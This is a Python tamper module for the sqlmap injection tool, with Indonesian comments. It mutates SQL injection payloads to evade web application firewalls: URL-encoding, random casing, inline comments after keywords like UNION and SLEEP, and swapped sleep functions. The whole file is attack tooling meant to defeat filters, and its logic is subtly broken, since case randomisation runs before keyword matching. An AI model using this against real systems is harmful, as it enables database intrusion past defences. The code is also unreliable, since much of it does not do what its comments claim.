from lib.core.enums import PRIORITY
import random

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    if not payload:
        return payload

    # Ganti spasi dengan %20
    payload = payload.replace(" ", "%20")

    # Fungsi untuk mengacak case huruf
    def random_case(s):
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in s)

    payload = random_case(payload)

    # Sisipkan komentar SQL acak setelah kata kunci umum untuk mengelabui filter
    comments = ["/*+*/", "/*xyz*/", "/*comment*/"]
    for comment in comments:
        if comment not in payload:
            payload = payload.replace("OR", "OR" + comment)
            payload = payload.replace("AND", "AND" + comment)
            payload = payload.replace("SELECT", "SELECT" + comment)
            payload = payload.replace("UNION", "UNION" + comment)
            payload = payload.replace("WAITFOR", "WAITFOR" + comment)
            payload = payload.replace("BENCHMARK", "BENCHMARK" + comment)
            payload = payload.replace("SLEEP", "SLEEP" + comment)
            payload = payload.replace("PG_SLEEP", "PG_SLEEP" + comment)
            payload = payload.replace("EXEC", "EXEC" + comment)

    # Modifikasi fungsi sleep agar lebih sulit terdeteksi
    if "SLEEP" in payload:
        # Ganti SLEEP dengan pg_sleep (PostgreSQL) atau sleep (MySQL) secara acak
        if random.choice([True, False]):
            payload = payload.replace("SLEEP", "pg_sleep")
        else:
            payload = payload.replace("SLEEP", "sleep")

    # Modifikasi union select untuk menghindari deteksi
    if "UNION" in payload:
        payload = payload.replace("UNION", "UNION" + random.choice(comments))

    return payload
